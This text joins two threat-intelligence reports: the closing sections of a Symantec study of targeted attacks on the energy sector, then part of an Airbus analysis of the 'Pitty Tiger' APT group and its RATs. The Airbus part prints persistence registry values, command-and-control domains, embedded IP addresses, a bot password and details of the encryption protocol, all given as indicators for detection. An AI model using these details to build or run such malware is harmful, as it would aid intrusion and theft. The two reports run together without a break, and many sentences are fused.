    the first ones to be attacked.Once compromised, the attacker will use these computers and try to explore deeper
    into internal networks.Securing and hardening of deployed operating systems with a working strategy for patch
    deployment is important.Reoccurring security awareness training can help users to identify social engineering
    attempts and prevent them from falling victim to them in the first place.The company can perform penetration testing on Web and network applications but also on ICSs to identify and
    remedy any vulnerability.For examples Web applications should be tested against SQL injection attacks.This can
    also help confirm if applied polices are followed through, if the patch level is correct on all computers and if systems
    are compliant.Companies can monitor the Internet for information about attacks in the same vertical and apply lessons learned
    where possible.In addition, different layers of security products can help achieve better overall protection.•	 Security Information and Event Manager system (SIEM): Using a SIEM can help correlate all related alerts in
       one place.This centralized view can be cross referenced with threat intelligence data to generate prioritization and
       an action plan.Painting the bigger picture of the overall security state can reveal previously unnoticed attacks.For example failed login attempts on internal servers could indicate a password breach.This includes logging of
       critical systems and synchronization of time among multiple systems.•	 Ingress and egress filtering: Filtering the network traffic with firewalls, content filters and IPS allows the control
       of data flows.This can prevent attackers from reaching internal systems.It is important to also monitor outbound
       traffic, as data exfiltration is a key point for cyberespionage.It should be noted that with the increased use of
       cloud services and mobile devices, some traffic might never pass through the company’s gateways.Where traffic
       blocking is too disruptive at least monitoring should be implemented.•	 Data loss prevention (DLP): DLP solutions can track the access and flow of critical information and prevent it
       from leaving the company or encrypt it automatically.•	 Endpoint protection: Depending on the usage pattern of the computer, different solutions are available to protect
       the endpoint.Antivirus solution with proactive detection methods like behavioral analysis and reputation scanning
       can prevent unknown malware from installing itself.HIPS (host based intrusion prevention systems), behavioral
       lockdown or whitelisting can protect computers from any kind of unwanted tampering without the need of
       constant updates.•	 System protection: For non-standard IT systems, hardening can increase the security.On industrial systems
       which are not often updated or that cannot be updated, exploitation can be prevented with the help of lockdown
       solutions like Symantec Critical System Protection (CSP).Through policies, only trusted system applications are
       allowed to run.ICS should be regularly checked and upgraded if new firmware exists.Where this is not possible
       HIPS and behavioral lockdown tools can be used to secure computers.•	 Email filtering: Proper email filtering can prevent many spear phishing attempts from reaching users.They can
       help minimize the risk of an untrained user falling for social engineering tricks.•	 Authentication: Some of the ICS contain hardcoded passwords and, wherever possible, these should be changed.ICS frequently use weakly authenticated protocols that allow for impersonation attacks.Where possible those
       authentication methods should be upgraded or at least closely monitored.Strong authentication or PKI should be
       used where applicable.Industrial control systems (ICS) should be specially protected and monitored.The control system and control
    network should be secured.Where possible, ICS should be separate from the Intranet.Isolating these networks alone
    is often not enough to protect the control network, but it can make it more difficult for attackers to succeed.For
    some systems it can make sense to have a plan to quickly disconnect or separate critical machines in the event of a
    detected cyberattack.Page 17
CONCLUSION




 In the second
 half of 2012, the
 energy sector was
 the second most
 targeted with 16
 percent of all the
 targeted attacks.Targeted Attacks Against the Energy Sector




Conclusion
    Cyberespionage campaigns and sabotage attacks are becoming increasingly common, with countless threat
    actors attempting to gain a foothold in some of the best protected organizations.At this stage, roughly
    five targeted attacks per day are being mounted on firms in the energy sector.These attacks have become
    increasingly sophisticated, although the capabilities and tactics used by these threat actors vary considerably.In the second half of 2012, the energy sector was the second most targeted with 16 percent of all the targeted
    attacks.This strong increase was mainly due to a large scale attack against one global oil company.In the first
    half of 2013, the energy sector was ranked fifth with 7.6 percent of all attacks focused on this sector.In general
    we have observed that attackers are becoming more efficient and focusing on smaller operations that attract
    less attention.The attackers tend to go after valuable information – such as maps of a new gas field – but the sector is also
    a major target for sabotage attacks, which will not generate direct profit for the attacker.Such disruptive
    attacks do already happen and may lead to large financial losses.State sponsored agents, competitors, internal
    attackers or hacktivists are the most likely authors of such sabotage attacks.Fortunately, there have not been many successful sabotage attacks against energy companies to date.However,
    the increasing number of connected systems and centralized control for ICS systems means that the risk
    of attacks in the future will increase.Energy and utility companies need to be aware of these risks and plan
    accordingly to protect their valuable information as well as their ICS or SCADA networks.Page 19
APPENDIX
                                                                         Targeted Attacks Against the Energy Sector




Appendix

 A.Spear phishing
   Social engineering themes used
   Social engineering is an essential part of spear phishing campaigns.A cleverly chosen, enticing message may prompt
   the user into opening an attachment.It is evident that most attackers are carefully selecting the themes that they
   use for their attacks.Some groups use real news stories and copy the text directly from the newspaper websites.Others try to appeal to personal hobbies in order to get the user’s attention.In the energy sector the most commonly used theme for spear phishing emails was money related (e.g.“Wage Data
   2012”) followed by sports related themes (e.g.“2012-13 NFL Playoffs Schedule”).As an example, the subject line “Wage Data 2012” was used in 944 emails, sent from 26 different email addresses
   to targets in nine different sectors.The attack was carried out over eight days and used the same infected Microsoft
   Word document in every instance.In general any topic can be used in a social engineering attempt, which makes it even harder for regular users to spot
   the attacks.Engagement in the Pacific
   Money related:
   •	 Acknowledge Payment
   •	 Payroll Invoice for week ending 02/15/2013 - 09509
   •	 Bank Details/Swift Code Error
   •	 Unable to process your most recent Payment
   Sport related:
   •	 2012 NFL Schedule
   •	 2012-13 NFL Playoffs Schedule
   •	 2012-08-02 Thursdays sixth day of the 2012 Olympic Games
   •	 London 2012 Medal Top 10
   Lifestyle related:
   •	 125 Best Foods for Men
   •	 2013 Lingerie Calendar... discover your deepest desires!Page 21
                                                                        Targeted Attacks Against the Energy Sector




•	 8 Minutes to a Longer Life
Special interest groups:
•	 Shamoon Upgrade Edition Malware Might Be Flame Copycat!•	 CyberAlert: Cyberattacks spread in banks all over the world
•	 3D printing technology used in Chinese fighter jets
•	 2013 Defense Industries Manufacturing
Spear phishing attack details
In the last six month of 2012 the average
number of targeted attacks observed per
day was 87 (with 14 in the energy sector).In the first six month of 2013 the average
number decreased to 60 targeted attacks
per day (five in the energy sector).The
spike in August and September 2012
is mostly related to a large scale attack
against a global oil company.The increase
in May 2013 was due to multiple attacks
against financial services, public sector
and IT service organizations.The government and public sector was
quantitatively the most attacked sector,
with 25.4 percent of all targeted attacks
falling in this sector for the last half of
2012 and 24 percent for the first half of       Figure 2: Number of targeted attacks per day
2013.The energy sector accounted for 7.6
percent of all targeted attacks, making it
the fifth most targeted sector in the first six month of 2013.This was a big decrease from 16.3 percent of all attacks
in the last half of 2012, when it was the second most attacked sector.This spike in 2012 is mainly due to a large
attack campaign against a global oil company which took place in September 2012.On average we saw
18.6 mail accounts
being attacked for
any given target
company in the
last half of 2012
(60.7 in the energy
sector) and 5.6 email
accounts in the first
half of 2013 (10 in
the energy sector).Overall, we see a
trend of the attacker
conducting more
focused attacks
against fewer
individuals.This
generates less noise
and the risk of getting
noticed or discovered
is smaller.These
emails are sent in
                          Figure 3: Top 10 of targeted attacks by vertical sectors
small bursts and then




                                                     Page 22
                                                                      Targeted Attacks Against the Energy Sector




repeated against a changing
target space till enough
computers are compromised.Attachment types used
Half of all the attachments
analyzed used an extension that
would run directly when double
clicked.This old method is still
the most common scheme used.Of all attachments analyzed,
38 percent were .exe and 12
percent were .src files.In total
only 6 percent used double
extensions like .pdf.exe to fool
the user.It should also be noted Figure 4: Average number of mail accounts targeted per company
that 23 percent were Microsoft
Word documents using some exploit to execute custom code on the computer.There were also some more exotic
extensions used like AutoIt scripts
(.au3) and ZX-Edit files (.zed), but
these are the exception rather
than the rule.It might be that the
attackers tried to bypass some email
filtering software by experimenting
with different attachment types.Sometimes even older exploits like
the Microsoft DirectX DirectShow
Length Record Remote Code
Execution Vulnerability (CVE-
2009-1539) in .mp4 files are still
occasionally used.This indicates
that either not all attackers have
the knowhow to use newer exploits
that are publicly available or they
speculate that the target has not
patched all computers.Some of
the attackers do not seem to be too
sophisticated.For example they used
“www.[COMPANY-NAME].com.exe” as
an attachment name, clearly missing
that the “.com” at the end would be
sufficient to run it and the additional
“.exe” was not needed.Figure 5: Extensions used in targeted attack emails




                                                    Page 23
                                                                           Targeted Attacks Against the Energy Sector




B. Visualization with TRIAGE
  To identify a series of targeted attacks that are likely performed by the same individuals, we have used a novel attack
  attribution methodology named TRIAGE.Developed by Symantec Research Labs, TRIAGE is data mining software that
  relies on multi-criteria decision analysis and intelligent data fusion algorithms to reliably link different attacks to the
  same source.This framework has been developed in order to automate cyberintelligence tasks and reduce the time
  needed to get insights into organized cybercrime activities.By enabling rapid analysis of large security data sets,
  Symantec analysts can then quickly and more efficiently attribute various waves of cyberattacks to a specific attack
  campaign likely run by the same individuals.Figure 6: Graph view of attack wave against company targeted in the New Year’s campaign


  The TRIAGE framework was recently enhanced with novel visualizations thanks to VIS-SENSE, a European research
  project aiming at developing visual analytics technologies for network security applications.C. Phases of targeted attacks
  As with any other targeted attacks, attacks against
  the energy sector often follow the same pattern.It
  can be broken down in different phases of attack.It
  should be noted that we have seen attackers modify
  their behavior and exceptions from the norm and this
  is possible especially if the target company has special
  circumstances or security measures in place.Figure 8: Typical phases of targeted attacks




                                                       Page 25
                                                                        Targeted Attacks Against the Energy Sector




Reconnaissance phase
During this phase the attacker tries to learn as much as possible about the targeted organization.Information sources often include social networks, job posting sites and press releases.This enables the attacker
to learn the contact details of possible target individuals as well as context that can be used in social engineering
scenarios.The attacker will often create a list of implemented security software used at the targeted company
from whatever information is available.These investigations often start completely passively without any direct
contact with the company, since there are many data sources publicly available.Subsequently the attacker can use
more interaction if needed.Some attackers go through all the effort of creating a fake social media account and
befriending key employees.After a period of small talk, to create a false sense of security, such a connection can
then be used to pass on an infected document or find out about some key information.Depending on the targeted
location, physical reconnaissance and eavesdropping may also be used.Incursion phase
The actual break-in occurs during this phase.The attacker usually compromises the network by delivering targeted
malware to vulnerable systems or employees.There are two main avenues of attack.One is to send spear phishing
emails, where a link to a malicious website or a malicious attachment is delivered using social engineering
techniques.The second method, which is gaining traction, is watering hole attacks, where the attacker infects a
website that has a high likelihood of being visited by the intended victim.By using IP address filters before infecting
any visitor of such sites, the attacker can reduce the number of infected systems and bring it to a manageable
quantity which can be assessed manually at another time.Some groups carefully plan watering hole attacks.For example the Hidden Lynx group stopped using a zero-day
vulnerability in a large watering hole attack after Microsoft released details on the vulnerability.This helped to cover
their activities and avoid unwanted attention.A few days later the group resumed the watering hole attack again,
this time using a different exploit.For more difficult targets, man-in-the-middle attacks can be used.These can be performed either at the same
physical location, posing as a genuine Wi-Fi hotspot or through supply chain attacks.This can enable the attacker to
swap an update of legitimate software for a maliciously crafted version.Once the victim installs the genuine looking
update, the attacker effectively gains control over the computer.Due to the complexity of such an attack, they are
rarely used.Depending on the skills of the attacker and the time available, the attacker might also attack systems at
the perimeter, such as Web servers, and try to break in from there.The malware used is not always sophisticated.Sometimes a regular off-the-shelf back door Trojan is used.In
these cases the person behind the malware orchestrating the commands is what makes the difference between a
targeted attack and a broad generic infection.Having said this, on very unique targets, we will often see the use
of a specifically designed piece malware, such as in the case of Stuxnet.Depending on the protection measures
implemented by the target, the attackers may also digitally sign their malware creation.In the past there have been
quite a few cases where code signing certificates were stolen and later misused to sign malware in order to pass it
unnoticed to high value targets.Discovery phase
Once the attacker has a foothold on one system, the next step is to create a plan for lateral movement through the
network until the interesting data is found.With more specialized teams of attackers, we can often observe that the
infected system is first analyzed to ensure that it is of interest to them.With watering hole attacks especially, it can
happen that computers that were not targeted get infected.Infected computers need to be assessed by the attacker
and, if necessary, removed to keep the profile, and with that the chances of exposure, low.One of the obvious tasks performed by attackers is to install key loggers, dump local credentials, search local
storage for saved accounts and sniff the network for passwords.Any account detail can be useful to them.Domain
administrator passwords are of especially high value, as they can help greatly in moving further through the Intranet.Often small scripts or even manual commands are used to comb through local files and create network mappings.Simple system commands can help the attacker to learn about installed security tools, saved links to internal




                                                     Page 26
                                                                       Targeted Attacks Against the Energy Sector




platforms and local address books.Once new systems are identified the
attacker will attempt to hop onto
them as well.In some instances
they might even use zero-day
vulnerabilities to spread further into
the network.One method which is gaining more
relevance is the hijacking of local
software distribution systems for
further distribution.This can either
be proprietary systems, such as the
case of Trojan.Jokra in South Korea,
or OS-specific, such as hijacking
Windows Update, in the case of
Flamer.Once the attackers have
successfully managed to create
and distribute their own package,       Figure 9: Typical commands used during discovery phase
they can easily infect all connected
systems at once.Especially in cases
of wiping attacks, such Trojan.Jokra, this is a very efficient way to disrupt as many computers as possible.If the target is assumed to be in a separated network not connected to the Internet, the malware used might try and
autonomously infect removable drives, like USB sticks, or project files for PLCs.This could allow the malware to be
manually introduced to the destination network, without the knowledge of the carrier, essentially jumping air gaps
into isolated networks.At the end of the discovery phase the attackers should know the internals of the infected networks and have
identified systems with interesting data or with connected industrial control systems.Capture/exfiltration phase
The capture and exfiltration phases are not always present.If the sole goal of the attackers is to cause a disruption
they may directly jump to a destructive payload.However, in most cases information is extracted first, which in turn
allows the sabotage to be constructed more efficiently at a later phase.In this phase the interesting data is gathered and sent back to the attackers.This can be done with different levels of
sophistication.The simple attacks compress the files and upload them through FTP or through a HTTP POST request
to a remote drop server.More sophisticated attackers obfuscate the data by XOR-ing it, encrypting it with proper
asymmetric encryption or embedding it into media files using steganography to hide the data from traffic inspection.In addition to this, the amount of data sent and the timing can be chosen in a smart way.For example, some malware
samples will send the data in smaller bursts so as not to swamp the network or generate network spikes that might
attract attention.Since most employees use laptops, the malware can use location awareness to detect if the
compromised computer is outside of the corporate network and send the data once it’s directly connected to the
Internet, such as from a Wi-Fi hotspot at an airport.This might allow the traffic to bypass perimeter security and
receive less scrutiny.In some instances the infected computer might not have a direct connection to the Internet.In
such cases, a previously compromised computer in the DMZ can act as a proxy, forwarding all the collected data.Disruption phase
This is when any destructive payload is launched.If the attackers are only after information this phase might not
happen at all.The targets and the goals for disruption attacks can be very different, there is no such thing as one-
size-fits-all for disruption attacks.For example, Stuxnet was tailored to attack a specific uranium enrichment facility
and would not work against a different target.In recent times, wiper Trojans have been popular in attacks against the energy sector.The malware deletes all files




                                                    Page 27
                                                                        Targeted Attacks Against the Energy Sector




   on a computer and then deletes the master boot record, rendering the computer unusable.This can happen on
   any operating systems and we have seen scripts for different UNIX flavors being used as well.Depending on
   the disaster recovery plan in place, these computers can be remotely recovered.However, there may still be an
   outage while the computers are being restored.Resources
   [1] Marco Cova, Corrado Leita, Olivier Thonnard, Angelos D. Keromytis, and Marc Dacier.An analysis of rogue
   AV campaigns.In Proc.of the 13th International Conference on Recent Advances in Intrusion Detection
   (RAID), 2010.[2] O.Thonnard, M.Dacier.A Strategic Analysis of Spam Botnets Operations.CEAS’11, Perth, WA, Australia,
   Sep 2011.[3] Jelena Isacenkova, Olivier Thonnard, Andrei Costin, Davide Balzarotti, Aurelien Francillon.Inside the SCAM
   Jungle: A Closer Look at 419 Scam Email Operations.International Workshop on Cyber Crime (IWCC 2013),
   IEEE S&P Workshops, 2013.[4] Olivier Thonnard, Leyla Bilge, Gavin O’Gorman, Seán Kiernan, Martin Lee.Industrial Espionage and
   Targeted Attacks: Understanding the Characteristics of an Escalating Threat.In Proc.Of the 15th
   International conference on Research in Attacks, Intrusions, and Defenses (RAID), 2012.[5] Symantec Internet Security Threat Report (ISTR), Volume 17, April 2012.Page 28
Author
Candid Wueest
Principal Software Engineer
﻿﻿




                                                                                                                               About Symantec
                                                                                        Symantec protects the world’s information and is the
                                                                                  global leader in security, backup, and availability solutions.Our innovative products and services protect people and
                                                                                  information in any environment—from the smallest mobile
                                                                                 device to the enterprise data center to cloud-based systems.Our industry-leading expertise in protecting data,
                                                                                   identities, and interactions gives our customers confidence
                                                                                        in a connected world.More information is available at
                                                                                       www.symantec.com or by connecting with Symantec at
                                                                                                                 go.symantec.com/socialmedia.Follow us on Twitter                                                                           Headquartered in Mountain View, Calif.,
       @threatintel                                                                                  Symantec has operations in 40 countries.More information is available at www.symantec.com.Visit our Blog
       http://www.symantec.com/connect/symantec-blogs/sr




                                    For specific country offices and contact numbers, please visit our website.Symantec World Headquarters                                                                                  Copyright © 2014 Symantec Corporation.All
350 Ellis St.                                                                                                rights reserved.Symantec, the Symantec Logo,
                                                                                                             and the Checkmark Logo are trademarks or
Mountain View, CA 94043 USA                                                                                  registered trademarks of Symantec Corporation
+1 (650) 527-8000                                                                                             or its affiliates in the U.S. and other countries.1 (800) 721-3934                                                                                             Other names may be trademarks of their
www.symantec.com                                                                                                                             respective owners.Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
Corporation.NO WARRANTY .The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use.Any use
of the technical documentation or the information contained herein is at the risk of the user.Documentation may include technical or other inaccuracies or
typographical errors.Symantec reserves the right to make changes without prior notice.Computer attacks known as “APT”
      (Advanced Persistent Threat) have become widely reported and emphasized by the media,
      damages are now considered as real and strategic trends are moving in cyber defense.AIRBUS Defence & Space – CyberSecurity unit responds to such attacks for its customers every
      day, developing a complete range of solutions.Today, we decided to release publicly information on a specific group of APT attackers known as
      “Pitty Tiger”.This information comes directly from investigations led by our Threat Intelligence.Pitty Tiger is a group of attackers that have been active since at least 2011.They have targeted
      private companies in several sectors, such as defense and telecommunications, but also at least
      one government.We have been able to track down this group of attackers and can provide detailed information
      about them.We were able to collect and reveal their “malware arsenal”.We also analyzed their
      technical organization.Our investigations indicate that Pitty Tiger has not used any 0day vulnerability so far, rather they
      prefer using custom malware, developed for the group’s exclusive usage.Our discoveries
      indicate that Pitty Tiger is a group of attackers with the ability to stay under the radar, yet still not
      as mature as other groups of attackers we monitor.Pitty Tiger is probably not a state-sponsored group of attackers.They lack the experience and
      financial support that one would expect from state-sponsored attackers.We suppose this group
      is opportunistic and sells its services to probable competitors of their targets in the private sector.We have been able to leverage several attackers profiles, showing that the Pitty Tiger group is
      fairly small compared to other APT groups, which is probably why we saw them work on a very
      limited amount of targets.At the end of this report, we provide indicators of compromise to help people detect current Pitty
      Tiger attacks.The kill chain describes briefly the way
    attackers do perform their actions.It can be summarized by the following scheme:




          RECONNAISSANCE PHASE

    The reconnaissance phase commences when an attacker selects a new target and involves the
    acquisition of information about that target.There is very little information available about this phase, and there is little data about it.The only
    way to collect information about this phase would be to already monitor all attackers’ actions at this
    step, which is hardly feasible.The longer the attackers spend time in attempting to understand their target and its online presence,
    the easier it will be to find efficient ways to penetrate that company’s systems.This reconnaissance phase is both about finding information to break into the targeted network
    successfully and about searching for data which could help to accelerate sensitive information
    isolation (like the name of a key employee for example).INITIAL COMPROMISE

    At this stage, the APT attackers have a solid knowledge of their target and its key employees.The
    attackers have everything they need to start looking for an entry point to the company’s network and
    establish one or several permanent backdoors into the environment.The attackers mostly rely on two techniques here to infect one or several computers, usually
    workstations, inside the target’s network: spear phishing and drive-by downloads.Spear phishing can be described as targeted e-mail phishing.In a spear phishing scheme, attackers
    send very few e-mails to targeted people.In fact, they can even send just a single e-mail.The trick
    is to target the right victim and provide it with the right content, so that they will click on a link leading
    to drive-by download of a malware, or open an attached file which will infect their computer.Some groups of attackers also use “watering hole” techniques to successfully compromise their
    targets.To build a watering hole attack, attackers do compromise the website of a third party,
    generally a supplier of the target, which is typically visited by a specific group of professionals and
    very likely by the target.Every visitor of the compromised third party is then infected.The method
    has one major drawback: it will also infect third parties who visit the website.Attackers have
    developed ways to avoid this.If their reconnaissance phase has been done effectively, they already
    know all IP ranges used by the target company.It just takes a few lines of code in the infecting script
    to only compromise visitors coming from the target IP ranges.Direct attacks against servers of the target can also be a way to penetrate the target’s network.ACCESS STRENGTHENING & LATERAL MOVES

    Attackers have gained access to one or several machines inside the target’s corporate network.They need to install several different backdoors in order to be able to always access the network.In
    case one backdoor falls, there will be others.As soon as the attackers are sure they have enough access, they start looking for two things:
    intellectual property (or anything else they want to know or steal) in alignment with predefined
    mission objectives, and a means of privilege escalation to facilitate lateral movement within the
    compromised environment.It generally does not take long before the attackers gain domain
    administrator privileges and dump all the Active Directory content.They use lateral moves between machines inside the network, and look for everything they need.This step is very hard to detect, since they only use valid credentials and legitimate administration
    tools such as PsExec.Public release
    Threat Intelligence
                                                  “The Eye of the Tiger”                         Page : 6/58

                                Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “The Eye of the Tiger”




            DATA EXFILTRATION

    Data exfiltration is the last step before the attackers loop to the lateral moves step, in a never-ending
    circle of prolonged access and information theft.They generally create archive files containing the content they want to exfiltrate, which are then sent
    to the attackers by using a remote administration tool (RAT) or transfer protocols such as FTP and
    HTTP.This phase is not the end of an APT attack.The attackers loop to the access strengthening/lateral
    moves stage and generally keep stealing more information and stay inside the network for more
    data gathering.For more information about all the APT phases, please refer to our APT Kill Chain blog post serie1.We decided to spend some time to investigate around
    this malware and found out that it was used exclusively by a single group of attackers.This malware
    family is known as “PittyTiger” by the anti-virus research community.We discovered this malware sample in June 2014, leading to a command & control (c&c) server still
    in activity.Our researches around this particular malware family revealed the “Pitty Tiger” group has been
    active since 2011, yet we found other publications1 which could probably be attributed to the same
    group of attacker back in 20102.This group uses other malware and tools during their APT operations, in addition to the PittyTiger
    RAT.A variant of the infamous Gh0st RAT dubbed “Paladin” has been used repeatedly by the PT group,
    together with other RATs which seem to be developed exclusively for the PT group: “MM RAT” (aka
    Troj/Goldsun-B), and “CT RAT”.Another variant of Gh0st RAT named “Leo” has been found inactive
    on a c&c server.We also found another malware, named “Troj/ReRol.A”.This one is also used by the group to infect
    workstations, collect system information, and install more malware on the infected computer.It acts
    as a first stage downloader and system data collector often used in the initial compromise of the
    Pitty Tiger campaigns, generally embedded in Microsoft Office documents.Thanks to server’s misconfigurations, we managed to get information from three c&c servers used
    by this group of attackers, which provided us with insight from the end of 2013 to the beginning of
    July 2014.Our investigation has been focused on the data we could get from these c&c servers but also on the
    Pitty Tiger environment.This whitepaper aims to expose the view we have on the group, especially on their infrastructure
    and capabilities.We hope this publication will bring further counter analysis from the research
    community to enrich the global common threat knowledge.We have been able to find a spear phishing e-mail crafted by the attackers.This e-mail spoofed the
    identity of an employee of a targeted company:


    From: XXXXXXX
    To: XXXXXXX
    File: 1 Attachment: Bird’s Eye Point of View.doc


    While the holiday season means clustering clustering ‘time for a
    vacation’ for many, there are Those That Will Be of us staying home this
    year.That’s why we’ve Decided to take you on a trip around the world
    from a bird’s eye view of the item!It’s safe to say That MOST of the
    lucky people on vacation Will not see breathtaking sights like these.Remember to look down!These documents were infecting
    the system with Troj/ReRol.A malware, which we will detail later in this report.This could mean that the Pitty Tiger group is using stolen material as spear phishing content either
    to target other persons in the compromised company, or to target other persons in a competitor’s
    company, or more generally to compromise another target.Pitty Tiger also seem to use fake Microsoft Office Excel content, yet we could only find empty
    content delivering once again the Troj/ReRol.A malware.DIRECT ATTACKS
    Although we have not been able to find evidences of any attack aimed at exploiting vulnerabilities on
    the group’s targets servers, we have been able to record several vulnerability scanning launched
    from one c&c server straight to the targets.The attackers have been using different vulnerability scanners aimed at their targets.While some
    targets have been scanned with “generic” vulnerability scanning tools like HScan or Fluxay and port
    scanners like Nmap, some other targets have been scanned for very specific vulnerabilities, like a
    ZyWALL vulnerability or a FORTINET product.We have also been able to testify that the Pitty Tiger group has successfully collected information on
    some of their targets by exploiting the HeartBleed1 bug.This vulnerability which exists on some old
    versions of OpenSSL allows attackers to collect data from chunks of memory from the targeted
    machine.It allowed the Pitty Tiger group to get admin credentials from at least one target, for
    example.We
    would advocate that this method is unwise when you want to stay furtive, and doing it from a c&c
    server is very surprising, to say the least.While the Pitty Tiger group is experienced on some
    aspects on its running APT campaigns, it definitely lacks some maturity here.Public release
    Threat Intelligence
                                              “The Eye of the Tiger”                        Page : 11/58

                            Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “The Eye of the Tiger”




    MALWARE INFORMATION

          TROJ/REROL.A
    One of the favorite methods used by the Pitty Tiger group to infect users is to use a Microsoft Office
    Word document which exploits a specific vulnerability.The payload infecting the system is malware known as “Troj/ReRol.A”.It is generally the first step of
    the initial compromise for Pitty Tiger campaigns.Exploitation

    We have been able to find one such document1 used by that group of attacker, exploiting CVE-
    2012-0158, an old critical vulnerability impacting Microsoft Office and corrected by Microsoft’s
    MS12-027 fix in April 2012.This vulnerability affects Microsoft Office versions up to Office 2010.We
    also found one RTF document embedding CVE-2014-1761, which is a more recent exploit.We discovered several different documents spreading this malware by triggering CVE-2012-0158
    vulnerability, yet we could not share them in this report, since these documents contain information
    about victims of the Pitty Tiger group.The discovery of this “old” vulnerability exploitation in June 2014 could mean that the Pitty Tiger
    group has no direct access to 0day exploits, or not enough budgets to buy some.It could also mean
    they use their low range exploit by default because it is working on their targets and is sufficient to
    compromise their workstations.The Word document we initially found was probably a “test” document used by the group.It can also download and execute binaries.Command & Control

    The data sent in the POST request has a 0x11 bytes header consisting of a fixed-value byte (0xc3)
    followed by a 0x10 bytes encryption key.The data following the header is encrypted using RC4 with
    the previous key.Once the data is deciphered, the last byte of the clear text should also be 0xc3.We have been able to decrypt the communications and confirmed what is transmitted to the c&c
    server.Once this data has been transferred to the c&c server, it responds by sending additional malware to
    execute on the machine.The c&c part consists of two files:
       - dr.asp: an ASP frontend instantiating a control, setting some variables, and passing the
          payload.- JHttpSrv.dll: a controller which should be registered via “regsvr32”.However, we found various files which
    could have been used as “32.exe” in the past:
       - 3200.exe
       - 322.exe
       - 32m.exe
       - 32mm.exe

    The 322.exe file is a legitimate, Chinese, calc.exe tool.It might have been used by the attackers to
    perform tests.The 3 others binaries are RATs, which will be detailed in the next parts.PITTYTIGER RAT

    This RAT is the origin of the attackers’ group name.“PittyTiger” is a mutex used by the malware.“Pitty Tiger” is also a string transmitted in the network communications of the RAT, as you will see in
    this chapter.It drops the “packet64.dll”, and
    injects it in “explorer.exe”.When executed, a mutex called “PittyTiger” is created.Persistence is achieved by adding the path to the binary to the WinlogonUserInit key:

              Key Path: \REGISTRY\USER\<SID>\Software\Microsoft\Windows
              NT\CurrentVersion\Winlogon
              Value Name: UserInit
              Value: C:\WINDOWS\system32\userinit.exe,C:\WINDOWS\system32\qmgrxp.exe,


    The “packet64.dll” is the main payload of the RAT.This id consists
    of the infected computer name followed by a dash and the lower word of the disk serial id.The data sent is simply encoded using base64, there is no cipher at all.We have been able
    to confirm that the author of those two families of malware is the same person, as will be seen in the
    next chapter about “CT RAT”.Pitty Tiger RAT – controller part




    Public release
    Threat Intelligence
                                                “The Eye of the Tiger”                           Page : 18/58

                              Copyright © 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger – “The Eye of the Tiger”




           CT RAT

    This remote administration tool is often used by the Pitty Tiger group.We have been able to acquire
    both the client and the server parts.We found two instances of the same binary with different names – 32mm.exe and mm32.exe1.This RAT seems to be an evolution of PittyTiger, since a specific server binary we found could
    handle both requests from CT and PittyTiger, and was indicated as compatible with PittyTiger.Moreover, the same commands are implemented in both RATs.The data is sent encrypted with
    RC4, and base64-encoded.The RC4 key is the Unicode form of the requested URL.The RAT can then receive commands from its c&c.Usual RAT features are implemented:
       - File Download (GET) and Upload (PUT)
       - Remote shell (ocmd/ccmd)
       - Configuration update (cfg)
       - Sleep (sleep)

    Version and author(s)

    Regarding the configuration, our sample communicates with “sop.avstore.com.tw”, and contains the
    string “Nov 13 2013”, which should be a version identifier.The c&c part is a Windows binary written in .NET.The text can be translated, thanks to Google Translate, as:

                 CT console (compatible pittytiger) v1.3
                 2013.12 by Trees and snow


    Further discussion about this author is provided in subsequent sections.MM RAT (AKA TROJ/GOLDSUN-B)

    We named this malware “MM RAT” at the beginning of our investigation, before we found an
    existing name for it, “Troj/Goldsun-B” according to Sophos.This is another remote administration
    tool often used by the Pitty Tiger crew.We have been able to acquire both a client and server part
    for it.Persistence is achieved by adding the path to the binary to the Winlogon Shell key:

                 Key Path: \REGISTRY\USER\<SID>\Software\Microsoft\Windows
                 NT\CurrentVersion\Winlogon
                 Value Name: Shell
                 Value: explorer.exe,C:\DOCUME~1\<UserName>\APPLIC~1\<binary name>,


    The RAT embeds its own DNS server IP addresses to make the c&c domain names resolutions.These addresses are listed below:

        -   63.251.83.36
        -   64.74.96.242
        -   69.251.142.1
        -   212.118.243.118
        -   216.52.184.230
        -   61.145.112.78
        -   218.16.121.32

    Command & Control

    It starts resolving its domains after injection, and immediately sends requests.First requests are
    used to check for updates (GET request on /httpdocs/update/update.ini).The communication protocol is quite simple: GET requests are used to receive data from the c&c,
    and POST requests to send data.In POST commands, the CGI name represents the command.The file is ciphered using RC4, using
    the MD5 hash of “rEdstArs” as the key.Our sample uses “mca.avstore.com.tw”, “star.yamn.net” and “bz.kimoo.com.tw” as c&c servers.It
    contains the “1.6.0” version number, and uses the password “9ol.8ik,” to authenticate with the bots.Unlike others c&c binaries, the c&c part of this RAT does not have a graphical interface, but can be
    remotely requested to manage the bots.Furthermore, no authentication is required to send
    commands to the c&c (but you need to know the configured password to interact with the bots).GET /httpdocs/mm/<bot_id>/Reply.sec)

    Network patterns

    These network patterns might ring bells in some researcher’s minds.The network communication
    used by this binary are the same as those used by the Enfal malware, which has been used in the
    past by the Lurid group (APT attackers) and by other threat actors in China1.An examination of the code did not reveal code similarities with the Enfal malware.We do not
    currently know why this malware uses the same patterns to communicate.PALADIN RAT

    This is another remote administration tool used by the Pitty Tiger group.We have been able to get
    both a client and server part of it.Installation

    The binary we found was dropped by a malicious Word document.This malware is a variant of the infamous Gh0st RAT1.Our specific sample uses “ssss0” instead of
    the usual “Gh0st” header for network communications.Command & Control

    The commands ID used in the communication protocol have also changed, but the features are
    quite the same.The configuration is directly embedded in the binary, and deciphered at runtime.Up to 5 c&c servers
    can be configured, but our sample only had one: “ey.avstore.com.tw:53”.“EY” could stand for “Ernst & Young”.It would not be very surprising, since a lot of different attack
    groups do use anti-virus vendors or other big company’s names to try to look more legitimate.Pitty
    Tiger is no exception, as detailed later in this report.We also found two c&c binaries, claiming to be versions 2.1 and 2.2 of the Paladin RAT controller.Version 2.1 answers to the “ssss0” header, while version 2.2 uses the classical “Gh0st” header.Although we
    have found it on a c&c server of the group, there is no evidence that is has been used by the group,
    in opposition to Paladin which is used often by Pitty Tiger.Moreover, the built malware we found in the same folder was configured to connect to a local IP
    address, probably for testing purposes.These c&c servers,
